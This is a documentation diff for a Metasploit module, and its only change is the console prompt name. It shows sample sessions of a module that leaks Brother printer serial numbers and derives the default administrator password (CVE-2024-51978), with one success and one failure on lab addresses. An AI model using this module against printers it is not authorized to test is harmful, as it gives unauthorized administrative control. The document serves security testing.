@@ -50,11 +50,11 @@ proceed to generate the correct default administrator password. The module valid
 the default administrator password for the device.
 
 ```
-msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > set VERBOSE true
+msf auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > set VERBOSE true
 VERBOSE => true
-msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > set RHOSTS 192.168.86.62
+msf auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > set RHOSTS 192.168.86.62
 RHOSTS => 192.168.86.62
-msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > show options 
+msf auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > show options 
 
 Module options (auxiliary/admin/misc/brother_default_admin_auth_bypass_cve_2024_51978):
 
@@ -79,7 +79,7 @@ Module options (auxiliary/admin/misc/brother_default_admin_auth_bypass_cve_2024_
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > run
+msf auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > run
 [*] Running module against 192.168.86.62
 [*] Attempting to leak serial number via HTTP
 [-] Unexpected HTTP response code: 302
@@ -91,7 +91,7 @@ msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > ru
 [*] Received an AuthCookie value: bi56MaYmMOhcwuH8miqCW5YvSGqKRqr8EOgiAr0yA20%3D
 [+] Successfully validated the administrator password: r/5LM&U>
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) >
+msf auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) >
 ```
 
 ### DCP-L2530DW
@@ -102,9 +102,9 @@ HTTPS (via CVE-2024-51977), however the password value generated was not the dev
 did not succeed.
 
 ```
-msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > set RHOSTS 192.168.86.3
+msf auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > set RHOSTS 192.168.86.3
 RHOSTS => 192.168.86.3
-msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > show options 
+msf auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > show options 
 
 Module options (auxiliary/admin/misc/brother_default_admin_auth_bypass_cve_2024_51978):
 
@@ -129,7 +129,7 @@ Module options (auxiliary/admin/misc/brother_default_admin_auth_bypass_cve_2024_
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > run
+msf auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > run
 [*] Running module against 192.168.86.3
 [*] Attempting to leak serial number via HTTP
 [*] Leaked target serial number via HTTP: ***************
@@ -138,5 +138,5 @@ msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > ru
 [*] Attempting to validate password
 [-] Failed to login with the administrator password: pX-KDn3+
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) >
+msf auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) >
 ```
